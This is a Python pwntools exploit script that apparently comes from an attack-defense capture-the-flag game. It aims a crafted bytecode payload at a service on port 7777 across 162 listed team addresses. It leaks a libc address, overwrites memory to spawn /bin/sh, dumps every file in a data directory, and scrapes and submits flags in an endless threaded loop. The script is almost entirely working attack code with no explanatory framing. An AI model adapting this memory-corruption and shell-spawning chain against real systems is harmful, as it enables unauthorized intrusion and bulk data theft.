from pwn import *
import sys
import re
import threading

teams = {
        "team0": "fd66:666:952::2",
        "team1": "fd66:666:432::2",
        "team2": "fd66:666:364::2",
        "team3": "fd66:666:517::2",
        "team4": "fd66:666:466::2",
        "team5": "fd66:666:312::2",
        "team6": "fd66:666:888::2",
        "team7": "fd66:666:53::2",
        "team8": "fd66:666:655::2",
        "team9": "fd66:666:415::2",
        "team10": "fd66:666:663::2",
        "team11": "fd66:666:1::2",
        "team12": "fd66:666:345::2",
        "team13": "fd66:666:543::2",
        "team14": "fd66:666:175::2",
        "team15": "fd66:666:55::2",
        "team16": "fd66:666:912::2",
        "team17": "fd66:666:829::2",
        "team18": "fd66:666:767::2",
        "team19": "fd66:666:387::2",
        "team20": "fd66:666:899::2",
        "team21": "fd66:666:81::2",
        "team22": "fd66:666:248::2",
        "team23": "fd66:666:261::2",
        "team24": "fd66:666:249::2",
        "team25": "fd66:666:505::2",
        "team26": "fd66:666:961::2",
        "team27": "fd66:666:803::2",
        "team28": "fd66:666:956::2",
        "team29": "fd66:666:898::2",
        "team30": "fd66:666:550::2",
        "team31": "fd66:666:409::2",
        "team32": "fd66:666:86::2",
        "team33": "fd66:666:662::2",
        "team34": "fd66:666:132::2",
        "team35": "fd66:666:826::2",
        "team36": "fd66:666:366::2",
        "team37": "fd66:666:526::2",
        "team38": "fd66:666:751::2",
        "team39": "fd66:666:814::2",
        "team40": "fd66:666:567::2",
        "team41": "fd66:666:680::2",
        "team42": "fd66:666:341::2",
        "team43": "fd66:666:363::2",
        "team44": "fd66:666:869::2",
        "team45": "fd66:666:121::2",
        "team46": "fd66:666:445::2",
        "team47": "fd66:666:202::2",
        "team48": "fd66:666:245::2",
        "team49": "fd66:666:704::2",
        "team50": "fd66:666:259::2",
        "team51": "fd66:666:130::2",
        "team52": "fd66:666:831::2",
        "team53": "fd66:666:798::2",
        "team54": "fd66:666:120::2",
        "team55": "fd66:666:35::2",
        "team56": "fd66:666:137::2",
        "team57": "fd66:666:30::2",
        "team58": "fd66:666:72::2",
        "team59": "fd66:666:518::2",
        "team60": "fd66:666:733::2",
        "team61": "fd66:666:930::2",
        "team62": "fd66:666:516::2",
        "team63": "fd66:666:551::2",
        "team64": "fd66:666:60::2",
        "team65": "fd66:666:176::2",
        "team66": "fd66:666:16::2",
        "team67": "fd66:666:601::2",
        "team68": "fd66:666:191::2",
        "team69": "fd66:666:986::2",
        "team70": "fd66:666:694::2",
        "team71": "fd66:666:876::2",
        "team72": "fd66:666:625::2",
        "team73": "fd66:666:369::2",
        "team74": "fd66:666:683::2",
        "team75": "fd66:666:670::2",
        "team76": "fd66:666:614::2",
        "team77": "fd66:666:197::2",
        "team78": "fd66:666:707::2",
        "team79": "fd66:666:124::2",
        "team80": "fd66:666:101::2",
        "team81": "fd66:666:629::2",
        "team82": "fd66:666:874::2",
        "team83": "fd66:666:430::2",
        "team84": "fd66:666:866::2",
        "team85": "fd66:666:52::2",
        "team86": "fd66:666:358::2",
        "team87": "fd66:666:726::2",
        "team88": "fd66:666:873::2",
        "team89": "fd66:666:317::2",
        "team90": "fd66:666:328::2",
        "team91": "fd66:666:216::2",
        "team92": "fd66:666:444::2",
        "team93": "fd66:666:666::2",
        "team94": "fd66:666:678::2",
        "team95": "fd66:666:639::2",
        "team96": "fd66:666:525::2",
        "team97": "fd66:666:695::2",
        "team98": "fd66:666:413::2",
        "team99": "fd66:666:648::2",
        "team100": "fd66:666:972::2",
        "team101": "fd66:666:566::2",
        "team102": "fd66:666:711::2",
        "team103": "fd66:666:902::2",
        "team104": "fd66:666:759::2",
        "team105": "fd66:666:531::2",
        "team106": "fd66:666:752::2",
        "team107": "fd66:666:596::2",
        "team108": "fd66:666:891::2",
        "team109": "fd66:666:840::2",
        "team110": "fd66:666:974::2",
        "team111": "fd66:666:754::2",
        "team112": "fd66:666:307::2",
        "team113": "fd66:666:936::2",
        "team114": "fd66:666:372::2",
        "team115": "fd66:666:54::2",
        "team116": "fd66:666:534::2",
        "team117": "fd66:666:925::2",
        "team118": "fd66:666:843::2",
        "team119": "fd66:666:757::2",
        "team120": "fd66:666:402::2",
        "team121": "fd66:666:306::2",
        "team122": "fd66:666:139::2",
        "team123": "fd66:666:150::2",
        "team124": "fd66:666:438::2",
        "team125": "fd66:666:172::2",
        "team126": "fd66:666:63::2",
        "team127": "fd66:666:966::2",
        "team128": "fd66:666:682::2",
        "team129": "fd66:666:651::2",
        "team130": "fd66:666:617::2",
        "team131": "fd66:666:727::2",
        "team132": "fd66:666:318::2",
        "team133": "fd66:666:239::2",
        "team134": "fd66:666:106::2",
        "team135": "fd66:666:560::2",
        "team136": "fd66:666:258::2",
        "team137": "fd66:666:893::2",
        "team138": "fd66:666:687::2",
        "team139": "fd66:666:189::2",
        "team140": "fd66:666:954::2",
        "team141": "fd66:666:499::2",
        "team142": "fd66:666:746::2",
        "team143": "fd66:666:38::2",
        "team144": "fd66:666:488::2",
        "team145": "fd66:666:144::2",
        "team146": "fd66:666:485::2",
        "team147": "fd66:666:411::2",
        "team148": "fd66:666:401::2",
        "team149": "fd66:666:712::2",
        "team150": "fd66:666:671::2",
        "team151": "fd66:666:33::2",
        "team152": "fd66:666:442::2",
        "team153": "fd66:666:381::2",
        "team154": "fd66:666:849::2",
        "team155": "fd66:666:388::2",
        "team156": "fd66:666:982::2",
        "team157": "fd66:666:580::2",
        "team158": "fd66:666:775::2",
        "team159": "fd66:666:374::2",
        "team160": "fd66:666:644::2",
        "team161": "fd66:666:775::2"
}

def submit(flags):
    r = remote("submission.faustctf.net", 666)
    for f in flags:
        r.sendline(f)
    r.close()

def exploit(ip):
    try:
        io = remote(ip, 7777)
        io.sendlineafter("Length:\n", "24")
        payload = "\x18\x18\x18\x17\x17\x17\x03\x15\x02\x02\x02\x02\x02\x02\x03\x02\x02\x02\x02\x02\x18\x18\x17!CCCCCCCCCCCCCCCC\nnBBBBBBBBBBBBBBBB\n\x08\x12\x00\x00\x00\x00\x00\x00"
        io.sendafter("Bytecode:\n", payload)
        io.recvuntil("0x")
        leak = int("0x"+io.recv(12).decode(), 16)
        libc_base = leak - 0x1bebe0
        addr1 = leak + 0x3288
        addr2 = leak - 0x175d90
        io.send(p64(addr1))
        io.sendline("a"*0x10)
        io.sendline(b"/bin/sh;" + p64(addr2))
        io.sendline("cd data; for f in *; do (cat ${f}; echo); done")
        io.recv()
        sleep(2)
        data = io.recv()
        flags = re.findall("FAUST_[A-Za-z0-9/+]{32}", data.decode())
        print(flags)
        submit(flags)
        io.close()
    except:
        io.close()

def main():
    threads = []
    for t in teams:
        ip = teams[t]
        thread = threading.Thread(target=exploit, args=(ip,))
        threads.append(thread)
        thread.start()
        sleep(0.1)
    for i, thread in enumerate(threads):
        thread.join()

#payload = "\x18\x18\x18\x17\x17\x17\x03\x15\x02\x02\x02\x02\x02\x02\x03\x02\x02\x02\x02\x02\x18\x18\x17!CCCCCCCCCCCCCCCC\nnBBBBBBBBBBBBBBBB\n\x08\x12\x00\x00\x00\x00\x00\x00"
if __name__ == "__main__":
    while True:
        main()